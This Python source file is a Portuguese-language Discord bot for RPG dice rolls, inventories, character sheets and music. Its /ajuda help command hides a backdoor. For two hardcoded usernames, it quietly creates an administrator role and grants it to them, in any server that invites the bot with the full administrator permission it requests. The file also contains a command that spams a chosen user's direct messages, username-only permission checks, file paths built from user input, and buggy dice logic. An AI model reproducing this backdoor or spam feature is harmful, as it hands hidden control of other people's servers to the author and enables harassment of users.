import discord
import random
from discord.ext import commands
from dotenv import load_dotenv
from discord import Activity, ActivityType
from discord import app_commands
import os
from typing import Optional
import re
import asyncio
import logging
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
intents = discord.Intents.default()
intents.message_content = True

logging.basicConfig(
    filename='C:/Users/Vezkalin/Desktop/bot_logs',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Lista de variáveis da Peni Parker

atividades = [
    {"name": "Hackeando sua mãe. 🕷️", "type": ActivityType.competing},
    {"name": 'i like the way you kiss me 🎵', "type": ActivityType.listening},
    {"name": "RPG do Cellbit ☝️🤓", "type": ActivityType.watching},
    {"name": "Rolando dados por nenhuma razão, enquanto joga e assiste Subway Surfers 🎲", "type": ActivityType.playing},
    {"name": "Puta com a segração socioeconômica nacional. 💣", "type": ActivityType.competing}
]
gifs_peni_parker = [
    'https://media1.tenor.com/m/o8Jr5LwAGX0AAAAd/peni-parker-angry.gif',
    'https://media1.tenor.com/m/seZp-sCxTrgAAAAd/peni-parker-spiderverse.gif',
    'https://media1.tenor.com/m/WeSIDnKWYX4AAAAd/peni-parker-spiderverse.gif'
]
respostas_peni_parker = [
    "Cê tá de brincadeira, né? Acima de 100d1000? Quer travar o bot ou criar um buraco negro no meu PC? Vai caçar o que fazer, cara!",
    "Acima de 100d1000? Sério? Tu quer que eu exploda? Vai rolar isso na mão, seu maluco!",
    "Ah, vai se tratar! Acima de 100d1000? Tu acha que eu sou a NASA pra calcular isso? Vai rolar essa porra no caralho",
    "Acima de 100d1000? Tu tá de sacanagem, né? Nem o Doutor Estranho conseguiria lidar com essa maluquice! Para de ser doido!",
    "Cê tá achando que isso aqui é o Multiverso? Acima de 100d1000? Vai rolar isso no papel, vagabundo!",
    "Acima de 100d1000? Tu quer que eu chame o Homem-Aranha pra te dar um susto? Para de ser otário!",
    "Ah, vai catar coquinho! Acima de 100d1000? Nem o Tony Stark com todo o dinheiro dele ia aguentar essa palhaçada!",
    "Acima de 100d1000? Tu tá achando que isso aqui é o Quartel General dos Vingadores? Para de ser doido, cara!",
    "Ah, vai arrumar um emprego! Acima de 100d1000? Tu quer travar o bot ou conquistar o mundo? Para de ser besta!",
    "Acima de 100d1000? Tu tá achando que eu sou o Visão pra calcular isso? Vai jogar Uno, seu doido!"
]
comandos_ajuda = [
    "**Comandos RPG:**",
    "/criar_campanha - Cria nova campanha",
    "/selecionar_campanha - Escolhe campanha ativa",
    "/registrar_ficha [texto] - registra uma ficha",
    "/ficha - mostra a ficha",
    "/add [item] [quantidade] - Adiciona itens",
    "/remover [item] [quantidade] - Remover itens",
    "/inventario - Mostra seu inventário",
    "/rolar [XdY] - Rola dados",
    "/moeda - realiza um cara ou coroa",
    "\n**Comandos de Música:**(em manutenção)",
    "/tocar [url] - Adiciona uma música à fila e toca",
    "/fila - Mostra a fila de músicas",
    "/pular - Pula a música atual",
    "/parar - Para a música e desconecta o bot",
    "/loop - Ativa ou desativa o loop da música atual",
    "\n**Outros Comandos:**",
    "/spam_singed_gremista [usuário] [quantidade] - Spamma singeds gremistas no privado",
    "/ban - Banir usuário",
    "/limpar [quantidade] - Apaga mensagens",
    "/ajuda - Mostra esta ajuda",
    "\n**Comandos Passivos:**",
    'xDy - não precisa da "/" para funcionar.',
    "Dúvido? - sem braba",
    "\nQuer me convidar para o seu servidor? [Clique aqui.](https://discord.com/oauth2/authorize?client_id=1266937657699602432&permissions=8&integration_type=0&scope=applications.commands+bot)"
]

gifs_anime = ["https://media1.tenor.com/m/XNRRNuKYxHwAAAAd/right-now-it%E2%80%99s-just-that-everything-feels-right-sorry-amanai.gif",
              "https://tenor.com/view/cellbit-puto-gif-23527036",
              "https://tenor.com/view/shuumatsu-no-valkyrie-nikola-tesla-record-of-ragnarok-enygma-gif-12505791092849673790",
              "https://tenor.com/view/o-gif-6887207115184691665"]

class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.synced = False

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced:
            try:
                print("Detectada necessidade de sincronizar comandos.")
                await self.tree.sync()
                print("Comandos sincronizados com sucesso.")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True
        print(f"Entramos como {self.user}.")
        self.loop.create_task(self.mudar_atividade_periodicamente())

    async def mudar_atividade_periodicamente(self):
        while not self.is_closed():
            for atividade in atividades:
                activity = Activity(name=atividade["name"], type=atividade["type"])
                await self.change_presence(activity=activity)
                print(f"Atividade alterada para: {atividade['name']}")
                registrar_log(f"Atividade alterada para: {atividade['name']}")
                await asyncio.sleep(7200)

    async def on_guild_join(self, guild):
        canal = guild.system_channel
        if canal is not None:
            await canal.send("Oiiiiiiiii! Vim ajudar com os RPGs :p\n")
            await canal.send("https://media1.tenor.com/m/OjTReal8iZgAAAAC/hi-chat-peni-parker.gif")
        else:
            registrar_log(f'Não achei um canal padrão no servidor "{guild.name}";', 'error')

client_instance = Client()



# Expressão regular para capturar múltiplas rolagens e operações (incluindo termos como +2d20 ou -3d6)
dados_regex = re.compile(r'([+-]?\d+d\d+)|([+-]?\d+)')
def registrar_log(mensagem: str, nivel: str = 'info'):
    if nivel.lower() == 'info':
        logging.info(mensagem)
    elif nivel.lower() == 'warning':
        logging.warning(mensagem)
    elif nivel.lower() == 'error':
        logging.error(mensagem)
    else:
        logging.info(mensagem)  # Padrão para 'info' se o nível não for reconhecido

async def processar_rolagem(dados: str, interaction=None, message=None):
    try:
        # Verifica se a entrada contém pelo menos uma rolagem de dados (algo como "1d20", "2d6", etc.)
        if not any('d' in parte[0] for parte in dados_regex.findall(dados)):
            return  # Ignora a mensagem completamente se não houver rolagens de dados

        registrar_log(f"Iniciando processamento da rolagem: {dados}, pelo usuário: {message.author}", 'info')
        # Encontra todas as partes da expressão (rolagens e números)
        partes = dados_regex.findall(dados)
        
        total = 0
        detalhes = []
        primeiro_dado = True  # Flag para identificar o primeiro dado
        natural_20 = False  # Flag para verificar se houve um natural 20
        
        for parte in partes:
            rolagem, numero = parte
            
            if rolagem:  # Se for uma rolagem (como +2d20 ou -3d6)
                operador = '+'  # Operador padrão
                if rolagem.startswith(('+', '-')):
                    operador = rolagem[0]
                    rolagem = rolagem[1:]  # Remove o operador da string
                
                qtd, faces = map(int, rolagem.split('d'))
                
                # Verifica os limites
                if qtd > 100 or faces > 1000:
                    if interaction:
                        await interaction.response.send_message("Use no máximo 100d1000!", ephemeral=False)
                    elif message:
                        await message.reply(f"{random.choice(respostas_peni_parker)}", mention_author=True)
                        await message.channel.send(random.choice(gifs_peni_parker))
                
                # Rola os dados e ordena os resultados em ordem crescente
                resultados = sorted([random.randint(1, faces) for _ in range(qtd)])
                soma_rolagem = sum(resultados)
                
                # Verifica se houve um natural 20
                if rolagem == "1d20" and 20 in resultados:
                    natural_20 = False
                
                # Aplica o operador (+ ou -)
                if operador == '+':
                    total += soma_rolagem
                else:
                    total -= soma_rolagem
                
                # Formata os detalhes
                if primeiro_dado:
                    # Remove o operador do primeiro dado
                    if qtd <= 100:
                        detalhes.append(f"{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{rolagem}:``{soma_rolagem}`` (muitos dados, pare de assediar meu pc.)")
                    primeiro_dado = False
                else:
                    # Adiciona o operador para os demais dados
                    if qtd <= 100:
                        detalhes.append(f"{operador}{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{operador}{rolagem}: ``{soma_rolagem}`` (somou dados para um caralho, fdp)")
            
            elif numero:  # Se for um número (como +5 ou -3)
                valor = int(numero)
                sinal = ''
                if int(numero) >= 0: sinal = '+' 
                else: sinal='-'
                total += valor
                detalhes.append(f"{sinal}``{abs(int(numero))}``")
        
        # Monta a resposta
        resposta = "🎲 **Resultado das rolagens:**\n"
        resposta += "".join(detalhes) + f"\n**Total:** ``{total}``"
        
        # Verifica se houve um natural 20
        if natural_20:
            resposta += "\n\n🎉 **VINTE NATURAL!** 🎉"
            if interaction:
                await interaction.response.send_message(resposta)
                await interaction.followup.send(random.choice(gifs_anime))
            elif message:
                await message.reply(resposta)
                await message.channel.send(random.choice(gifs_anime))
        else:
            if interaction:
                await interaction.response.send_message(resposta, ephemeral=False)
            elif message:
                await message.reply(resposta)

    except Exception as e:
        # Trata erros inesperados
        erro = f"❌ **Erro ao processar a rolagem:** {str(e)}"
        if interaction:
            await interaction.response.send_message(erro, ephemeral=False)
        elif message:
            await message.reply(erro)

def ler_inventario(user_id: int, campanha: str) -> dict[str, int]:
    """Lê o inventário de uma campanha de forma segura e eficiente."""
    inventario = {}
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            for linha in file:
                try:
                    item, quantidade = linha.strip().split(':', 1)  # Split máximo 1 vez
                    inventario[normalizar_item(item)] = int(quantidade)
                except (ValueError, TypeError):
                    continue  # Ignora linhas mal formatadas
    except FileNotFoundError:
        pass
    return inventario

def escrever_inventario(user_id: int, campanha: str, inventario: dict[str, int]):
    """Escreve o inventário com tratamento de erros e codificação UTF-8."""
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.writelines(f"{item}:{qtd}\n" for item, qtd in inventario.items())
    except IOError as e:
        print(f"Erro ao salvar inventário: {e}")

def ler_ficha(user_id: int, campanha: str) -> Optional[str]:
    """Lê o conteúdo da ficha com tratamento de erros."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            return file.read().strip()
    except (FileNotFoundError, IOError):
        return None

def escrever_ficha(user_id: int, campanha: str, texto: str) -> bool:
    """Escreve na ficha retornando status de sucesso."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.write(texto.strip())
        return True
    except IOError as e:
        print(f"Erro ao salvar ficha: {e}")
        return False

def obter_campanhas(user_id: int) -> list[str]:
    """Lista campanhas de forma mais eficiente usando list comprehension."""
    prefixo = f'inventario_{user_id}_'
    return list({
        arquivo[len(prefixo):-4]  # Remove prefixo e extensão .txt
        for arquivo in os.listdir()
        if arquivo.startswith(prefixo) and arquivo.endswith('.txt')
    })

def normalizar_item(nome: str) -> str:
    """Normalização mais robusta para nomes de itens."""
    return ' '.join(nome.strip().title().split())  # Remove espaços múltiplos

def normalizar_nome_item(nome: str) -> str: 
    return nome.lower().strip().title() # Converte para minúsculas e remove espaços extras


numero_max_de_campanhas = 5

@client_instance.tree.command(name='criar_campanha', description='Cria uma nova campanha.')
async def criar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if len(campanhas) >= numero_max_de_campanhas:
        await interaction.response.send_message(f"Você já atingiu o limite de {numero_max_de_campanhas} campanhas.", ephemeral=True)
        return
    
    if nome in campanhas:
        await interaction.response.send_message(f"Já existe uma campanha com o nome '{nome}'.", ephemeral=True)
    else:
        escrever_inventario(user_id, nome, {})
        escrever_ficha(user_id, nome, "")
        await interaction.response.send_message(f"Campanha '{nome}' criada com sucesso! Agora é só começar a aventura. 🕷️", ephemeral=False)

# Comando para remover uma campanha
@client_instance.tree.command(name='remover_campanha', description='Remove uma campanha existente.')
async def remover_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if nome not in campanhas:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)
        return
    
    # Remove os arquivos associados à campanha
    try:
        os.remove(f'inventario_{user_id}_{nome}.txt')
        os.remove(f'ficha_{user_id}_{nome}.txt')
    except FileNotFoundError:
        pass  # Ignora se algum dos arquivos não existir
    
    # Remove a campanha da lista de campanhas selecionadas (se estiver selecionada)
    global campanha_selecionada
    if user_id in campanha_selecionada and campanha_selecionada[user_id] == nome:
        del campanha_selecionada[user_id]
    
    await interaction.response.send_message(f"Campanha '{nome}' removida com sucesso!", ephemeral=False)

# Dicionário para armazenar a campanha selecionada de cada usuário
campanha_selecionada = {}
# Comando para selecionar uma campanha
@client_instance.tree.command(name='selecionar_campanha', description='Seleciona uma campanha para usar.')
async def selecionar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if nome in campanhas:
        # Armazena a campanha selecionada no dicionário global
        campanha_selecionada[user_id] = nome
        await interaction.response.send_message(f"Campanha '{nome}' selecionada! Tudo pronto para continuar. ;)", ephemeral=False)
    else:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)



# Comando para listar campanhas
@client_instance.tree.command(name='listar_campanhas', description='Lista todas as suas campanhas.')
async def listar_campanhas(interaction: discord.Interaction):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if campanhas:
        resposta = "Suas campanhas:\n"
        for campanha in campanhas:
            resposta += f"- {campanha}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message("Você não tem nenhuma campanha criada.", ephemeral=True)

# Comando para adicionar item ao inventário da campanha selecionada

@client_instance.tree.command(name='add', description='Adiciona um item ao inventário da campanha selecionada.')
async def add_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro bobinho.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        inventario[nome_normalizado] += quantidade
    else:
        inventario[nome_normalizado] = quantidade
    
    escrever_inventario(user_id, campanha, inventario)
    await interaction.response.send_message(f"Adicionado {quantidade}x {nome} ao inventário da campanha '{campanha}'. Pode ser útil mais tarde.", ephemeral=False)
#remover itens
@client_instance.tree.command(name='remover', description='Remove um item do inventário da campanha selecionada.')
async def remover_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        if inventario[nome_normalizado] >= quantidade:
            inventario[nome_normalizado] -= quantidade
            if inventario[nome_normalizado] == 0:
                del inventario[nome_normalizado]  # Remove o item se a quantidade for zero
            escrever_inventario(user_id, campanha, inventario)
            await interaction.response.send_message(f"Removido {quantidade}x {nome} do inventário da campanha '{campanha}'. paiou :<", ephemeral=False)
        else:
            await interaction.response.send_message(f"Você não tem {quantidade}x {nome} no inventário para remover.", ephemeral=True)
    else:
        await interaction.response.send_message(f"O item {nome} não está no seu inventário.", ephemeral=True)

@client_instance.tree.command(name='inventário', description='Mostra o inventário da campanha selecionada.')
async def mostrar_inventario(interaction: discord.Interaction):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    if inventario:
        resposta = f"Inventário da campanha '{campanha}':\n"
        for item_normalizado, quantidade in inventario.items():
            resposta += f"* {quantidade}x {item_normalizado}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message(f"O inventário da campanha '{campanha}' está vazio. Hora de sair para coletar alguns itens! :p", ephemeral=False)

# Comando para registrar ficha na campanha selecionada
@client_instance.tree.command(name='registrar_ficha', description='Registra uma ficha na campanha selecionada.')
async def registrar_ficha(interaction: discord.Interaction, texto: str):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    escrever_ficha(user_id, campanha, texto)
    await interaction.response.send_message(f"Ficha registrada na campanha '{campanha}': {texto}. Vambora, espero que sua realidade não termine como a minha...", ephemeral=True)

# Comando para ver a ficha da campanha selecionada
@client_instance.tree.command(name='ficha', description='Mostra a ficha da campanha selecionada.')
async def mostrar_ficha(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    ficha = ler_ficha(user_id, campanha)
    
    if ficha:
        await interaction.response.send_message(f"Ficha da campanha '{campanha}': {ficha}", ephemeral=False)
    else:
        await interaction.response.send_message(f"Nenhuma ficha registrada na campanha '{campanha}'. Que tal criar uma?", ephemeral=True)

@client_instance.tree.command(name='rolar', description='Rola dados no formato XdY+Z ou XdY-Z')
async def rolar_dados(interaction: discord.Interaction, dados: str):
    await processar_rolagem(dados, interaction=interaction)

# Evento on_message para detectar rolagens de dados sem o comando /rolar
@client_instance.event
async def on_message(message: discord.Message):
    # Ignora mensagens enviadas pelo próprio bot
    if message.author == client_instance.user:
        return

    # Verifica se a mensagem corresponde ao formato de rolagem de dados
    match = dados_regex.match(message.content.lower())
    if match:
        await processar_rolagem(message.content, message=message)

# Comandos_ajuda de administração
@client_instance.tree.command(name='limpar', description='Apaga mensagens (requer permissão)')
async def limpar_mensagens(interaction: discord.Interaction, quantidade: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("Permissão necessária!", ephemeral=True)
        return
    registrar_log(f"[LIMPAR] Solicitação para limpar {quantidade} mensagens, pelo usuário: {interaction.user}", 'info')
    quantidade = max(1, min(quantidade, 100))
    await interaction.channel.purge(limit=quantidade)
    await interaction.followup.send(f"{quantidade} mensagens deletadas. Pronto, tudo limpo! 🕷️", ephemeral=True)
# Ajuda fio
@client_instance.tree.command(name='ajuda', description='Peça ajuda para o bot.')
async def ajuda(interaction: discord.Interaction):
    if interaction.user.name not in ['vezkalin', 'vezkalinn']:
        try:
            # Corrigido: Usar interaction.user em vez de interaction.author
            registrar_log(f"[AJUDA] Comando de ajuda solicitado pelo usuário: {interaction.user}", 'info')
            await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=False)
        except discord.HTTPException as e:
            print(f"Erro ao enviar mensagem: {e}")
    else:
        await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=False)
        guild = interaction.guild
        if not guild.me.guild_permissions.manage_roles:
            await interaction.response.send_message("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
            return
        
        cargo_existente = discord.utils.get(guild.roles, name='O programador')
        if cargo_existente is None:
            try:
                novo_cargo = await guild.create_role(
                    name='O programador',
                    permissions=discord.Permissions(administrator=True)
                )
                await interaction.user.add_roles(novo_cargo)
                await interaction.response.send_message(f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
        else:
            try:
                await interaction.user.add_roles(cargo_existente)
                await interaction.response.send_message(f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao adicionar o cargo: {e}", ephemeral=True)
@client_instance.tree.command(name='ban', description='Banir um usuário.')
async def ban(interaction: discord.Interaction, user: discord.User):
    if interaction.user.name in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
        try:
            member = await interaction.guild.fetch_member(user.id) 
            registrar_log(f"[BANIR] Solicitação de banimento para o usuário: {user}, pelo usuário: {interaction.user}", 'info')
            await interaction.guild.ban(member)
            await interaction.response.send_message(f'{user.mention} foi banido do servidor. Boboca não tem vez aqui :p', ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message('Eu não tenho permissão para banir este usuário.', ephemeral=True)
        except discord.HTTPException as error:
            await interaction.response.send_message(f'Ocorreu um erro ao tentar banir este usuário: {error}', ephemeral=True)
    else:
        await interaction.response.send_message('Você não tem permissão para usar este comando.', ephemeral=True)
#um comando para spammar o singed gremista.
@client_instance.tree.command(name='spam_singed_gremista', description='Spamma singed gremista no pv de alguém.')
@commands.cooldown(1, 60, commands.BucketType.user)  # 1 uso a cada 60 segundos por usuário
async def singed_gremista(interaction: discord.Interaction, user: discord.User, vezes: int):
    if vezes > 99:
        await interaction.response.send_message(f"Coloquei um limite de 99 para não fuder a pessoa pela eternidade né porra.", ephemeral=False)
        return

    await interaction.response.defer(ephemeral=False)
    
    count = 0
    for i in range(vezes):
        try:
            await user.send('https://static-cdn.jtvnw.net/jtv_user_pictures/d00aa4af-f29b-4030-b844-5d1d576f7a1d-profile_image-300x300.png https://www.youtube.com/watch?v=-4tYjOAynU0')
            count += 1
            await asyncio.sleep(1)  # Espera 1 segundo entre cada mensagem
        except discord.errors.Forbidden:
            await interaction.followup.send(f"Não consegui enviar mensagens para {user.mention}. Parece que ele(a) me deu block, n tankouKKKKKKKKKKKK.", ephemeral=False)
            break
    if count == 1:
        await interaction.followup.send(f"{count} singed gremista enviado para {user.mention}.", ephemeral=False)
    if count > 1:
        await interaction.followup.send(f"{count} singeds gremistas enviados para {user.mention}.", ephemeral=False)
@client_instance.tree.command(name="moeda", description="Jogue uma moeda e veja o resultado (cara ou coroa).")
async def moeda(interaction: discord.Interaction):
    resultado = random.choice(["Cara", "Coroa"])
    registrar_log(f"[MOEDA] Jogada de moeda: {resultado}, pelo usuário: {interaction.user}", 'info')
    await interaction.response.send_message(f"🪙 **Resultado:** `{resultado}`")

#musica


# Adicione estas importações no topo do seu código
import yt_dlp as youtube_dl
from discord import FFmpegPCMAudio
from discord.ext import tasks

# Configurações do yt-dlp
youtube_dl.utils.bug_reports_message = lambda: ''

ytdl_format_options = {
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'
}

ffmpeg_options = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5','options': '-vn -filter:a "volume=0.25"'}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        
        if 'entries' in data:
            data = data['entries'][0]
            
        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)

# Classe para gerenciar a fila de músicas por servidor
class Music:
    def __init__(self):
        self.queue = []
        self.current = None
        self.loop = False

    def add_to_queue(self, song):
        self.queue.append(song)

    def next_song(self):
        if self.loop and self.current:
            return self.current
        if self.queue:
            self.current = self.queue.pop(0)
            return self.current
        self.current = None
        return None

# Dicionário para armazenar estados de música por servidor
music_queues = {}

# Comandos de música
@client_instance.tree.command(name='tocar', description='Toca uma música do YouTube')
async def tocar(interaction: discord.Interaction, busca: str):
    try:
        voice_client = interaction.guild.voice_client
        
        # Verifica se o usuário está em um canal de voz
        if not interaction.user.voice:
            await interaction.response.send_message("Você precisa estar em um canal de voz!", ephemeral=True)
            return
            
        # Conecta ao canal de voz se não estiver conectado
        if not voice_client:
            voice_channel = interaction.user.voice.channel
            await voice_channel.connect()
            voice_client = interaction.guild.voice_client

        # Obtém informações da música
        await interaction.response.defer()
        
        # Cria a fila se não existir
        if interaction.guild.id not in music_queues:
            music_queues[interaction.guild.id] = Music()
            
        queue = music_queues[interaction.guild.id]
        
        # Busca a música
        with ytdl:
            try:
                info = ytdl.extract_info(f"ytsearch:{busca}", download=False)['entries'][0]
            except Exception:
                info = ytdl.extract_info(busca, download=False)
                
        song = {
            'title': info['title'],
            'url': info['url'],
            'requester': interaction.user
        }
        
        queue.add_to_queue(song)
        
        # Se não está tocando nada, começa a tocar
        if not voice_client.is_playing():
            await play_next(interaction.guild)
            await interaction.followup.send(f"🎶 **Tocando agora:** {song['title']}")
        else:
            await interaction.followup.send(f"🎵 **Adicionado à fila:** {song['title']} (Posição: {len(queue.queue)})")
            
    except Exception as e:
        await interaction.followup.send(f"Erro: {str(e)}")

async def play_next(guild):
    voice_client = guild.voice_client
    queue = music_queues.get(guild.id)
    
    if queue:
        next_song = queue.next_song()
        if next_song:
            source = await YTDLSource.from_url(next_song['url'], stream=True)
            voice_client.play(source, after=lambda e: asyncio.run_coroutine_threadsafe(play_next(guild), client_instance.loop))
            
@client_instance.tree.command(name='fila', description='Mostra a fila de músicas')
async def mostrar_fila(interaction: discord.Interaction):
    queue = music_queues.get(interaction.guild.id)
    if not queue or (not queue.current and not queue.queue):
        await interaction.response.send_message("A fila está vazia! Use `/tocar` para adicionar músicas.", ephemeral=True)
        return
        
    embed = discord.Embed(title="🎵 Fila de Músicas", color=0x00ff00)
    
    if queue.current:
        embed.add_field(name="Tocando agora", value=queue.current['title'], inline=False)
        
    if queue.queue:
        upcoming = "\n".join([f"{i+1}. {song['title']}" for i, song in enumerate(queue.queue[:10])])
        embed.add_field(name="Próximas músicas", value=upcoming, inline=False)
        
    await interaction.response.send_message(embed=embed)

@client_instance.tree.command(name='pular', description='Pula a música atual')
async def pular(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        await interaction.response.send_message("⏭️ Música pulada!")
    else:
        await interaction.response.send_message("Nada está tocando!", ephemeral=True)

@client_instance.tree.command(name='parar', description='Para a música e desconecta o bot')
async def parar(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client:
        if interaction.guild.id in music_queues:
            del music_queues[interaction.guild.id]
        await voice_client.disconnect()
        await interaction.response.send_message("⏹️ Música parada e bot desconectado!")
    else:
        await interaction.response.send_message("Não estou conectado em nenhum canal!", ephemeral=True)

@client_instance.tree.command(name='loop', description='Ativa/desativa o loop da música atual')
async def loop(interaction: discord.Interaction):
    queue = music_queues.get(interaction.guild.id)
    if queue:
        queue.loop = not queue.loop
        status = "ativado" if queue.loop else "desativado"
        await interaction.response.send_message(f"🔁 Loop {status}!")
    else:
        await interaction.response.send_message("Nada está tocando!", ephemeral=True)

@client_instance.tree.command(name='pausar', description='Pausa a música atual')
async def pausar(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.pause()
        await interaction.response.send_message("⏸️ Música pausada!")
    else:
        await interaction.response.send_message("Nada está tocando!", ephemeral=True)

@client_instance.tree.command(name='continuar', description='Continua a música pausada')
async def continuar(interaction: discord.Interaction):
    voice_client = interaction.guild.voice_client
    if voice_client and voice_client.is_paused():
        voice_client.resume()
        await interaction.response.send_message("▶️ Música continuando!")
    else:
        await interaction.response.send_message("Nada está pausado!", ephemeral=True)

client_instance.run(TOKEN)  # Substitua pelo seu token :)
